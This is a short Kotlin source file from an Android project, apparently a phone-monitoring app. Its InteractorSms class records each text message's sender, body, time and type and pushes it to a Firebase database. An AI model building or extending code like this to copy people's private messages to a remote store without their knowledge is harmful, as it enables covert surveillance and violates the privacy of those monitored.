package com.github.xero.istheapp.services.sms

import android.content.Context
import com.github.xero.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.xero.istheapp.data.model.Sms
import com.github.xero.istheapp.services.base.BaseInteractorService
import com.github.xero.istheapp.utils.ConstFun.getDateTime
import com.github.xero.istheapp.utils.Consts.DATA
import com.github.xero.istheapp.utils.Consts.SMS
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String,type: Int) {
        val sms = Sms(smsAddress, smsBody, getDateTime(),type)
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms).addOnCompleteListener {
            if (isNullService()) getService()!!.stopServiceSms()
        }
    }

}